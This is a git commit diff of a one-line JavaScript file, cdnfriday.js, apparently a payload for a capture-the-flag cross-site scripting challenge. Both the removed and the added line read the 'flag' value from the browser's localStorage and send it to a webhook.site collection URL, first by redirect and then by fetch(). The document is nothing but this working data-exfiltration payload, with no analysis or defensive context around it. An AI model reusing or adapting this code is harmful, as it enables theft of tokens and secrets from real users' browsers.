db9e5ed1588e10418f1e13b3d386665ac1e62c85
zoe <git@zoe.lgbt>
2026-09-14 19:10:50 +0000

    Update cdnfriday.js

--- cdnfriday.js
+++ cdnfriday.js
@@ -1,1 +1,1 @@
-window.location=`https://webhook.site/9eb217ef-b70a-4f81-9936-149f6034f5a1/${window.localStorage.getItem('flag')}`
+fetch(`https://webhook.site/9eb217ef-b70a-4f81-9936-149f6034f5a1/${window.localStorage.getItem('flag')}`)
